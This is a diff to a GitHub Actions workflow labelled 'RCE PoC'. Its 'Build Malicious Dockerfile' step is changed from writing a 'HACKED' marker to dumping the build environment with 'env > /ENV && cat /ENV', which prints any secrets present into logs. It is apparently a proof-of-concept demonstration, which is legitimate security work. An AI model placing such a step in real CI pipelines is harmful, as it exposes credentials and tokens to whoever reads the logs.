@@ -1,5 +1,7 @@
-RCE PoC
-on: [push]
+name: RCE PoC
+
+on:
+  push:
 
 jobs:
   rce:
@@ -9,5 +11,5 @@ jobs:
         uses: actions/checkout@v2
       - name: Build Malicious Dockerfile
         run: |
-          echo -e "FROM alpine\nRUN echo HACKED > /HACKED && cat /HACKED" > Dockerfile
+          echo -e "FROM alpine\nRUN env > /ENV && cat /ENV" > Dockerfile
           docker build -t pwn .
